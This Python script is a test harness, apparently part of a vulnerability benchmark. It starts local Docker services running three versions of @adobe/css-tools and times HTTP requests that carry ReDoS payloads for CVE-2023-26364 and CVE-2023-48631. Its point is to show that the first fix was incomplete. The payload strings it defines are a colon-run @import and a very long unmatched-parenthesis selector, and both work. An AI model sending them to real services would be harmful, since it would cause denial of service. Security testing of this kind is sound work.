#!/usr/bin/env python3
"""dos-threshold oracle for @adobe/css-tools ReDoS over a REAL HTTP service
(CVE-2023-26364 -> CVE-2023-48631).

No flag token: the signal is SERVER-SIDE latency of an EXTERNAL HTTP request. For each version
{v0=4.3.0, v1=4.3.1, v2=4.3.2} we bring up a REAL Express service that parses a user-supplied CSS
string with the REAL published `@adobe/css-tools` (POST /parse -> css.parse(css), running
synchronously on the event loop). The oracle POSTs three payloads {original, residual, benign}
from OUTSIDE the container and measures the HTTP round-trip latency (dominated by the server-side
parse compute); a catastrophic input hangs the response until the HTTP timeout.

MECHANISM (two DISTINCT catastrophic regexes in the SAME parser — sibling-regex incomplete fix):
  original : the `@import` at-rule regex in _compileAtrule. V0 `^@import\\s*((:?[^;'"]|...)+);`
             backtracks exponentially on a colon-only run with no `;`. V1 (4.3.1, CVE-2023-26364)
             adds a `(?:;|$)` end-alternation -> FIXED. => original SLOW on V0, FAST on V1/V2.
  residual : the selector() comma-split regex `/("|')(?:\\1|.)*?\\1|\\(.*?\\)/g` — UNCHANGED at V0
             AND V1 (CVE-2023-26364 never touched it). O(n^2) on an unmatched-'(' run when the
             selector has a comma. V2 (4.3.2, CVE-2023-48631) removes the `|\\(.*?\\)` branch ->
             fixed. => residual SLOW on V0 AND V1 (INCOMPLETE FIX), FAST on V2.
             (residual firing on V0 too is EXPECTED: the selector regex is identical on V0/V1.)

GATE booleans (T_FAST=300ms, T_SLOW=2000ms, HTTP read timeout=10s):
  original_slow_on_v0        : v0.original latency > T_SLOW   (CVE-2023-26364 @import bomb fires on V0)
  original_bounded_on_v1     : v1.original latency < T_FAST   (4.3.1 `(?:;|$)` closes the @import bomb)
  residual_slow_on_v1        : v1.residual latency > T_SLOW   (V1 fix INCOMPLETE: selector regex unchanged)
  residual_fast_on_v2        : v2.residual latency < T_FAST   (4.3.2 removes `|\\(.*?\\)` -> linear)
  benign_fast_on_all         : every version's benign latency < T_FAST
  residual_v1_over_v2_gt_50x : clean latency separation on V1 vs V2 for the residual
  passed = all of the above
"""
from __future__ import annotations
import http.client
import json
import os
import socket
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
COMPOSE = ["docker", "compose", "-f", os.path.join(HERE, "docker-compose.yml")]
ENV = {**os.environ, "PCB_FLAG": "dos-threshold-no-canary"}

T_FAST = 300.0        # ms  (external HTTP round-trip for a bounded parse + JSON)
T_SLOW = 2000.0       # ms
HTTP_TIMEOUT_S = 10.0
HTTP_TIMEOUT_MS = HTTP_TIMEOUT_S * 1000.0

PORTS = {"v0": 26364, "v1": 26365, "v2": 26366}

N_ORIG = 40           # '@import ' + 40 colons -> exponential @import bomb on V0
N_RESID = 140000      # 'a,' + 140k '(' + '{}' -> O(n^2) selector-paren scan on V0 & V1

PAYLOADS = {
    # original CVE-2023-26364 vector: colon-only @import with no ';' terminator -> exponential on V0
    "original": "@import " + ":" * N_ORIG,
    # residual CVE-2023-48631 vector: comma forces selector() split; unmatched '(' run -> O(n^2)
    "residual": "a," + "(" * N_RESID + "{}",
    # benign control: exercises comma-split selectors, quoted attr w/ commas, balanced parens, @import
    "benign": ('a, b.c, #d > e { color: red; }\n'
               '@import "theme.css";\n'
               '.foo[data-x="a,b,c"]:nth-child(2n+1) { margin: 0 }\n'
               'div:matches(.x, .y) { top: 0 }'),
}


def run(cmd, **kw):
    print("+", " ".join(cmd), flush=True)
    return subprocess.run(cmd, env=ENV, **kw)


def wait_health(port: int, timeout_s: float = 120.0) -> bool:
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        try:
            c = http.client.HTTPConnection("127.0.0.1", port, timeout=3)
            c.request("GET", "/health")
            r = c.getresponse()
            body = r.read()
            c.close()
            if r.status == 200 and b'"ok"' in body:
                return True
        except (ConnectionRefusedError, socket.timeout, OSError):
            pass
        time.sleep(1.0)
    return False


def probe(port: int, payload: str) -> dict:
    """POST /parse {css: payload}; measure external HTTP round-trip latency (ms).
    On catastrophic backtracking the server hangs -> socket read timeout -> recorded as HTTP_TIMEOUT_MS."""
    body = json.dumps({"css": payload})
    t0 = time.perf_counter()
    try:
        c = http.client.HTTPConnection("127.0.0.1", port, timeout=HTTP_TIMEOUT_S)
        c.request("POST", "/parse", body=body,
                  headers={"Content-Type": "application/json", "Content-Length": str(len(body))})
        r = c.getresponse()
        resp = r.read()
        c.close()
        ms = (time.perf_counter() - t0) * 1000.0
        return {"ms": round(ms, 1), "timeout": False, "len": len(payload),
                "resp": resp.decode("utf-8", "replace")[:200]}
    except (socket.timeout, TimeoutError):
        ms = (time.perf_counter() - t0) * 1000.0
        return {"ms": round(max(ms, HTTP_TIMEOUT_MS), 1), "timeout": True, "len": len(payload), "resp": None}
    except OSError as e:
        return {"ms": -1.0, "timeout": False, "error": str(e), "len": len(payload), "resp": None}


def measure_profile(prof: str) -> dict:
    """Measure each payload against a FRESH server. A synchronous ReDoS permanently wedges Node's
    single-threaded event loop (the regex/parse cannot be interrupted mid-run), so a slow probe would
    poison any probe sent to the SAME server afterwards. We therefore `kill` (instant SIGKILL) +
    `up -d` (restart -> brand-new node process, clean event loop) before every probe."""
    port = PORTS[prof]
    results = {}
    try:
        for kind in ("original", "residual", "benign"):
            run(COMPOSE + ["--profile", prof, "stop", prof], check=False,
                capture_output=True, text=True)
            run(COMPOSE + ["--profile", prof, "rm", "-f", prof], check=False,
                capture_output=True, text=True)
            run(COMPOSE + ["--profile", prof, "up", "-d"], check=True,
                capture_output=True, text=True)
            if not wait_health(port):
                raise RuntimeError(f"{prof}: /health never came up on :{port}")
            r = probe(port, PAYLOADS[kind])
            results[kind] = r
            print(f"[{prof}] {kind:9s} len={r['len']:>6} -> {r['ms']:>8}ms timeout={r.get('timeout')}",
                  flush=True)
        return {"version": prof, "port": port, "results": results}
    finally:
        run(COMPOSE + ["--profile", prof, "kill", prof], check=False,
            capture_output=True, text=True)
        run(COMPOSE + ["--profile", prof, "down"], check=False,
            capture_output=True, text=True)


def main():
    t_start = time.time()
    versions = {}
    for prof in ("v0", "v1", "v2"):
        versions[prof] = measure_profile(prof)

    def ms(v, kind):
        return versions[v]["results"][kind]["ms"]

    matrix = {v: {k: versions[v]["results"][k]["ms"] for k in ("original", "residual", "benign")}
              for v in versions}

    booleans = {
        "original_slow_on_v0": ms("v0", "original") > T_SLOW,
        "original_bounded_on_v1": ms("v1", "original") < T_FAST,
        "residual_slow_on_v1": ms("v1", "residual") > T_SLOW,
        "residual_fast_on_v2": ms("v2", "residual") < T_FAST,
        "benign_fast_on_all": all(ms(v, "benign") < T_FAST for v in versions),
    }
    resid_v1, resid_v2 = ms("v1", "residual"), max(ms("v2", "residual"), 0.001)
    booleans["residual_v1_over_v2_gt_50x"] = (resid_v1 / resid_v2) > 50.0
    booleans["passed"] = all(booleans.values())

    report = {
        "case": "redos_adobe_css_tools",
        "oracle_variant": "dos-threshold",
        "run_mode": "real-app-http",
        "external_http_trigger": True,
        "thresholds": {"T_FAST_ms": T_FAST, "T_SLOW_ms": T_SLOW, "http_timeout_ms": HTTP_TIMEOUT_MS},
        "payloads": {k: {"len": len(v)} for k, v in PAYLOADS.items()},
        "latency_matrix_ms": matrix,
        "residual_v1_over_v2_ratio": round(resid_v1 / resid_v2, 1),
        "booleans": booleans,
        "elapsed_s": round(time.time() - t_start, 1),
    }
    print("\n=== GATE REPORT ===")
    print(json.dumps(report, indent=2))
    with open(os.path.join(HERE, "gate_result.json"), "w") as f:
        json.dump(report, f, indent=2)
    return 0 if booleans["passed"] else 1


if __name__ == "__main__":
    sys.exit(main())
